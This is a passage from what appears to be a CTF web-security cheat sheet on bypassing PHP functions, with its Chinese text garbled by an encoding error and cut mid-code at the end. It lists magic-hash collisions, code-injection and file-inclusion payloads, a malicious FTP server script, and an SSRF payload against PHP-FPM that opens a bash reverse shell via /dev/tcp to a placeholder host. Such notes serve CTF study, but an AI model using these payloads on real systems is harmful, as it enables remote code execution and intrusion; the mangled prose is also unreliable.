ç¯‡</a></p></li><li><p>ç¬¦å·</p><ul><li><p>åˆ†å·ï¼š<code>?&gt;</code>é—­åˆ</p></li><li><p>å°æ‹¬å·ï¼š<code>?c=include$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php</code></p></li></ul></li><li><p>æ•°ç»„</p><p>preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›falseã€‚</p></li><li><p>PCREå›æº¯æ¬¡æ•°é™åˆ¶</p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a></p><p><code>pcre.backtrack_limit</code>ç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ï¼Œé»˜è®¤ä¸º1000000ï¼Œå¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œpreg_matchä¼šè¿”å›falseã€‚</p></li></ol><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><ol><li><p>å‘½åç©ºé—´ï¼ˆ\ï¼‰</p><blockquote><p>åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code>ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨<code>\</code>è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä¾‹</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title">ccc</span>;\<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> \system(<span class="string">&#x27;cat /tmp/flag_XXXX&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-é¢˜è§£-å­¦ä¹ ç¯‡/#function">Code-Breaking-Puzzles-é¢˜è§£-å­¦ä¹ ç¯‡</a></p></li></ol><h3 id="SERVER-â€˜QUERY-STRINGâ€™"><a href="#SERVER-â€˜QUERY-STRINGâ€™" class="headerlink" title="$_SERVER[â€˜QUERY_STRINGâ€™]"></a>$_SERVER[â€˜QUERY_STRINGâ€™]</h3><ol><li><p>URLç¼–ç </p><p>$_SERVER[â€˜QUERY_STRINGâ€™]ä¸ä¼šè¿›è¡ŒURLDecodeã€‚</p></li><li><p>å˜é‡è¦†ç›–</p><p><code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p></li></ol><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><ol><li><p>POSTè¦†ç›–</p><p>$_REQUESTåŒæ—¶æ¥å—GETå’ŒPOSTçš„æ•°æ®ï¼Œå¹¶ä¸”POSTå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼ï¼Œåªéœ€è¦åŒæ—¶GETå’ŒPOSTæœ‰ç›¸åŒçš„å‚æ•°ï¼Œåœ¨æ£€æµ‹æ—¶POSTçš„å€¼å°±ä¼šè¦†ç›–GETçš„å€¼ä»è€Œç»•è¿‡ã€‚</p></li></ol><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><ol><li>ä½¿ç”¨ php://input æˆ– data://text/plain,xxx å†™æ–‡ä»¶</li></ol><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><ol><li><p>æ”»å‡»php-fpmï¼ˆæœªæˆæƒè®¿é—®æ¼æ´ï¼‰</p><p>å¦‚æœç›®æ ‡ä¸»æœºä¸Šæ­£åœ¨è¿è¡Œç€ <code>PHP-FPM</code>ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª<code>file_put_contents()</code>å‡½æ•°çš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¯ä»¥ä½¿ç”¨ <code>FTP</code> åè®®çš„è¢«åŠ¨æ¨¡å¼ï¼šå®¢æˆ·ç«¯è¯•å›¾ä»<code>FTP</code>æœåŠ¡å™¨ä¸Šè¯»å–/å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–åˆ°ä¸€ä¸ªæŒ‡å®šçš„<code>IP</code>å’Œç«¯å£ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šåˆ°<code>127.0.0.1:9000</code>ï¼Œè¿™æ ·å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºçš„ <code>PHP-FPM</code> å‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œé€ æˆ<code>SSRF</code>ã€‚</p><p><code>file_put_contents($_GET[&#39;file&#39;], $_GET[&#39;data&#39;]);</code></p><p>å…ˆç”¨ <code>gopherus</code> ç”Ÿæˆä¸€ä¸ªåå¼¹<code>shell</code>çš„<code>payload</code>ï¼Œæˆªå– <code>_</code> åé¢çš„éƒ¨åˆ†</p><p><code>/var/www/html/index.php</code></p><p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot;</code></p><p>å…³äº<code>FTP</code>çš„<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangzhufei/article/details/86177015">è¿”å›ç </a>ï¼Œæˆ‘ä»¬çœ‹åˆ°<code>227</code>ï¼š</p><blockquote><p><code>Entering Passive Mode &lt;h1,h2,h3,h4,p1,p2&gt; è¿›å…¥è¢«åŠ¨æ¨¡å¼(h1,h2,h3,h4,p1,p2)</code></p></blockquote><p>æˆ‘ä»¬å¯ä»¥ç”¨æ¥è¿›å…¥è¢«åŠ¨æ¨¡å¼ï¼Œ<code>h</code>å’Œ<code>p</code>åˆ†åˆ«ä¸ºåœ°å€å’Œç«¯å£ï¼Œæ­å»ºä¸€ä¸ªæ¶æ„çš„ <code>ftp</code> æœåŠ¡å™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">123</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡å™¨ä¹‹åå†ç›‘å¬åå¼¹çš„ç«¯å£ï¼š</p><p><code>http://ip:8080/ftp.php?file=ftp://@ip:123/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0F%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F!SCRIPT_FILENAME/usr/share/nginx/html/phpinfo.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/1234%200%3E%261%22%27)%3Bdie(%27-----Made-by-SpyD3r-----%0A%27)%3B%3F%3E%00%00%00%00</code></p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/10/24/Web%E5%AE%89%E5%85%A8/%E6%95%99%E4%BD%A0%E7%94%A8%20FTP%20SSRF%20%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/">æ•™ä½ ç”¨ FTP SSRF æ‰“ç©¿å†…ç½‘</a></p></li></ol><h3 id="sha1-æ¯”è¾ƒ"><a href="#sha1-æ¯”è¾ƒ" class="headerlink" title="sha1()æ¯”è¾ƒ"></a>sha1()æ¯”è¾ƒ</h3><ol><li><p>ä»¥æ•°ç»„ä¸ºå‚æ•°</p><p>sha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹ï¼Œå°†æŠ¥é”™å¹¶è¿”å›falseã€‚</p></li><li><p>ç‰¹æ®Šæƒ…å†µæ±‡æ€»</p><blockquote><p>10932435112: 0e07766915004133176347055865026311692244<br>aaroZmOk: 0e66507019969427134894567494305185566735<br>aaK1STfY: 0e76658526655756207688271159624026011393<br>aaO8zKZF: 0e89257456677279068558073954252716165668<br>aa3OFF9m: 0e36977786278517984959260394024281014729</p><p>0e1290633704: 0e19985187802402577070739524195726831799</p></blockquote></li></ol><h3 id="md5-æ¯”è¾ƒ"><a href="#md5-æ¯”è¾ƒ" class="headerlink" title="md5()æ¯”è¾ƒ"></a>md5()æ¯”è¾ƒ</h3><ol><li><p>æ¯”è¾ƒç¼ºé™·åˆ©ç”¨ï¼ˆé™==å¼±ç±»å‹æƒ…å†µï¼‰</p><blockquote><p>QNKCDZO - 0e830400451993494058024219903391</p><p>PJNPDWY: 0e291529052894702774557631701704<br>NWWKITQ: 0e763082070976038347657360817689<br>NOOPCJF: 0e818888003657176127862245791911<br>MMHUWUV: 0e701732711630150438129209816536<br>MAUXXQC: 0e478478466848439040434801845361<br>IHKFRNS: 0e256160682445802696926137988570<br>GZECLQZ: 0e537612333747236407713628225676<br>GGHMVOE: 0e362766013028313274586933780773<br>GEGHBXL: 0e248776895502908863709684713578<br>EEIZDOI: 0e782601363539291779881938479162<br>DYAXWCA: 0e424759758842488633464374063001<br>DQWRASX: 0e742373665639232907775599582643<br>BRTKUJZ: 00e57640477961333848717747276704<br>ABJIHVY: 0e755264355178451322893275696586</p><p>240610708 - 0e462097431906509019562988736854<br>s878926199a - 0e545993274517709034328855841020<br>s155964671a - 0e342768416822451524974117254469<br>s214587387a - 0e848240448830537924465865611904<br>s878926199a - 0e545993274517709034328855841020<br>s1091221200a - 0e940624217856561557816327384675</p><p>aaaXXAYW: 0e540853622400160407992788832284<br>aabg7XSs: 0e087386482136013740957780965295<br>aabC9RqS: 0e041022518165728065344349536299</p><p>0e215962017 - 0e291242476940776845150308577824</p></blockquote></li><li><p>æ¯”è¾ƒç¼ºé™·åˆ©ç”¨ï¼ˆé™===å¼ºç±»å‹æƒ…å†µï¼‰</p><p>å·¥å…·ï¼šfastcoll</p><p>ä¸¤ç»„ç»è¿‡urlç¼–ç åçš„å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></li><li><p>ä»¥æ•°ç»„ä¸ºå‚æ•°</p><p>md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULLï¼Œä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚</p></li><li><p>NaN å’Œ INF</p><p><code>NAN</code>å’Œ<code>INF</code>ï¼Œåˆ†åˆ«ä¸ºéæ•°å­—å’Œæ— ç©·å¤§ï¼Œä½†æ˜¯var_dumpä¸€ä¸‹å®ƒä»¬çš„æ•°æ®ç±»å‹å´æ˜¯doubleï¼Œé‚£ä¹ˆåœ¨md5å‡½æ•°å¤„ç†å®ƒä»¬çš„æ—¶å€™ï¼Œæ˜¯å°†å…¶ç›´æ¥è½¬æ¢ä¸ºå­—ç¬¦ä¸²â€NANâ€å’Œå­—ç¬¦ä¸²â€INFâ€ä½¿ç”¨çš„ï¼Œä½†æ˜¯å®ƒä»¬æ‹¥æœ‰ç‰¹æ®Šçš„æ€§è´¨ï¼Œå®ƒä»¬ä¸ä»»ä½•æ•°æ®ç±»å‹ï¼ˆé™¤äº†trueï¼‰åšå¼ºç±»å‹æˆ–å¼±ç±»å‹æ¯”è¾ƒå‡ä¸ºfalseï¼Œç”šè‡³<code>NAN===NAN</code>éƒ½æ˜¯falseï¼Œä½†<code>md5(&#39;NaN&#39;)===md5(&#39;NaN&#39;)</code>ä¸ºtrueã€‚</p></li><li><p>md5(string,raw)</p><blockquote><p><strong>md5(string,raw)</strong></p><p><u>string</u> å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚<br><u>raw</u> å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›FALSE - é»˜è®¤ï¼Œ32 å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚</p></blockquote><p><code>ffifdyop</code>ï¼Œç»è¿‡md5å‡½æ•°åç»“æœä¸º <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>ï¼›</p><p><code>129581926211651571912466741651878684928</code>ï¼Œç»è¿‡md5å‡½æ•°åç»“æœä¸º <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</code>ï¼›</p></li></ol><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><ol><li><p>ä»£ç æ³¨å…¥</p><p>æºç  <code>$func(&#39;&#39;,$arg)</code> ï¼š</p><p><code>$func=&#39;create_function&#39;;</code></p><p><code>$arg=&#39;2;&#125;phpinfo();//&#39;</code> æˆ– <code>$arg=&#39;2;&#125;require(base64_decode(xxx));var_dump(get_defined_vars());//</code></p></li></ol><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><ol><li><p>è°ƒç”¨ç±»é™æ€æ–¹æ³•</p><p><code>call_user_func(&#39;Func::_One&#39;,&#39;one&#39;)</code></p><p><code>call_user_func([&#39;Func&#39;,&#39;_One&#39;])</code></p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1411010">https://cloud.tencent.com/developer/article/1411010</a></p></li></ol><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h3><ol><li>ä¸å¯è§å­—ç¬¦æ’å…¥ï¼ˆ%80-%ffï¼‰</li></ol><h3 id="ereg-eregi"><a href="#ereg-eregi" class="headerlink" title="ereg() / eregi()"></a>ereg() / eregi()</h3><ol><li><p>NULLæˆªæ–­æ¼æ´</p><p>ereg()å‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´,å¯ä»¥%00æˆªæ–­ï¼Œé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼çš„æ£€æŸ¥ã€‚</p><p>ereg()åªèƒ½å¤„ç†å­—ç¬¦ä¸²çš„ï¼Œé‡åˆ°æ•°ç»„åšå‚æ•°è¿”å›NULLã€‚</p></li></ol><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><ol><li><p>ä»¥æ•°ç»„ä¸ºå‚æ•°</p><p>strpos()å‡½æ•°å¦‚æœä¼ å…¥æ•°ç»„ï¼Œä¾¿ä¼šè¿”å›NULLã€‚</p></li><li><p>äºŒæ¬¡ç¼–ç ç»•å…³é”®å­—</p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=76671">https://bugs.php.net/bug.php?id=76671</a></p></li></ol><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><ol><li><p>å‡½æ•°ç¼ºé™·</p><blockquote><p><code>strcmp()</code>å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²(åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå®šä¹‰ä¸­æ˜¯æ¯”è¾ƒ<strong>å­—ç¬¦ä¸²ç±»å‹</strong>çš„ï¼Œä½†å¦‚æœè¾“å…¥å…¶ä»–ç±»å‹è¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ä¸­è¯´åˆ°åœ¨<code>php 5.2</code>ç‰ˆæœ¬ä¹‹å‰ï¼Œåˆ©ç”¨<code>strcmp</code>å‡½æ•°å°†æ•°ç»„ä¸å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒä¼šè¿”å›<code>-1</code>ï¼Œä½†æ˜¯ä»<code>5.3</code>å¼€å§‹ï¼Œä¼šè¿”å›<code>0</code>ã€‚</p></blockquote></li></ol><h3 id="add-slashes"><a href="#add-slashes" class="headerlink" title="add_slashes()"></a>add_slashes()</h3><ol><li><code>$&#123;phpinfo()&#125;</code></li></ol><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><ol><li><p>ä»£ç æ‰§è¡Œï¼ˆé™/eæ¨¡å¼ï¼‰</p><blockquote><p><code>preg_replace</code>(PHP 5.5)<br>åŠŸèƒ½ ï¼š å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢<br>å®šä¹‰ ï¼š <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )</code><br>æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ å¦‚æœåŒ¹é…æˆåŠŸä»¥ replacement è¿›è¡Œæ›¿æ¢<br><code>$pattern</code> å­˜åœ¨ /e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå…è®¸ä»£ç æ‰§è¡Œ<br>/e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œæ˜¯ preg_replace() å°† <code>$replacement</code> å½“åšphpä»£ç æ¥æ‰§è¡Œ</p></blockquote></li></ol><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h3><ul><li><p><strong>FILTER_VALIDATE_EMAIL</strong></p><p>å½¢å¼ï¼š<code>local-part@domain-part</code></p><ol><li>é‚®ç®±local-partéƒ¨åˆ†å¯ä»¥ç”¨åŒå¼•å·åŒ…è£¹ï¼ŒåŒå¼•å·å†…å³å¯å¡«å…¥ä»»æ„å­—ç¬¦ï¼Œå¦‚<code>&quot;Joe&#39;Blow&quot;@example.com</code></li></ol></li><li><p><strong>FILTER_VALIDATE_URL</strong></p><ol><li><code>0://www.baidu.com;</code></li></ol></li></ul><h3 id="is-file-file-exists"><a href="#is-file-file-exists" class="headerlink" title="is_file() / file_exists()"></a>is_file() / file_exists()</h3><ol><li><p>è¶…è¿‡20æ¬¡è½¯é“¾æ¥åå¯ä»¥ç»•è¿‡ï¼š</p><p><code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p></li></ol><h3 id="include-ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"><a href="#include-ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="include() ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"></a>include() ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰</h3><ol><li><p>æ—¥å¿—åŒ…å«</p><p>URLï¼š<code>?x=/var/log/nginx/access.log</code></p><p>ä¿®æ”¹<code>User-Agent</code>ä¸º<code>&lt;?php highlight_file(&#39;xxx.php&#39;); ?&gt;</code></p></li><li><p>æœ‰åç¼€ç»•è¿‡</p><p><code>?c=data:text/plain,&lt;?php system(&#39;ls&#39;)?&gt;</code></p><p><code>?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4</code></p><p><code>?c=data:,&lt;?php system(&#39;ls&#39;)?&gt;</code></p></li><li><p>zip/pharåè®®åŒ…å«ï¼ˆæœ‰ç‰¹å®šåç¼€ï¼‰</p><p>è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºéªŒè¯åŒ…å«æ–‡ä»¶ä¸ºç‰¹å®šåç¼€æ—¶ã€‚</p><ul><li><p><strong>zip</strong></p><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªzipæ–‡ä»¶ï¼Œé‡Œé¢å‹ç¼©ç€ä¸€ä¸ªphpè„šæœ¬ã€‚</p><p>ç„¶åæ„é€ <code>zip://php.zip#php.jpg</code>ï¼š</p><p><code>http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg</code></p></li><li><p><strong>phar</strong> (PHPç‰ˆæœ¬&gt;5.3.0)</p><p>é¦–å…ˆè¦ç”¨pharç±»æ‰“åŒ…ä¸€ä¸ªpharæ ‡å‡†åŒ…ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/phartest2.zip&#x27;</span>, <span class="number">0</span>,<span class="string">&#x27;phartest2&#x27;</span>,Phar::ZIP); </span><br><span class="line"><span class="variable">$x</span>=file_get_contents(<span class="string">&#x27;./php.php&#x27;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;addFromString(<span class="string">&#x27;a.jpg&#x27;</span>, <span class="variable">$x</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼šç”Ÿæˆä¸€ä¸ªzipçš„å‹ç¼©æ–‡ä»¶ã€‚ç„¶åæ„é€ </p><p><code>http://127.0.0.1/file.php?file=phar://php.zip/php.jpg</code></p></li></ul></li><li><p>åˆ©ç”¨<strong>session.upload_progress</strong></p><p>å¯ä»¥åˆ©ç”¨<code>session.upload_progress</code>å°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ï¼Œä»è€ŒåŒ…å«sessionæ–‡ä»¶ã€‚å‰æéœ€è¦çŸ¥é“sessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ã€‚</p><p>å¦‚æœ<code>session.auto_start=On</code> ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚</p><p>sessionæœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œ<code>session.use_strict_mode</code>é»˜è®¤å€¼ä¸º<code>0</code>ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®<code>PHPSESSID=TGAO</code>ï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>/tmp/sess_TGAO</code>ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼ç”±<code>ini.get(&quot;session.upload_progress.prefix&quot;)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼</code>ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œã€‚</p><p>é»˜è®¤é…ç½®<code>session.upload_progress.cleanup = on</code>å¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶å†…å®¹æ¸…ç©ºå‰è¿›è¡ŒåŒ…å«åˆ©ç”¨ã€‚</p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p><strong>å¸¸è§PHP-Sessionå­˜æ”¾ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat fl0g.php&#x27;);&quot;</span>&#125;</span><br><span class="line">url = <span 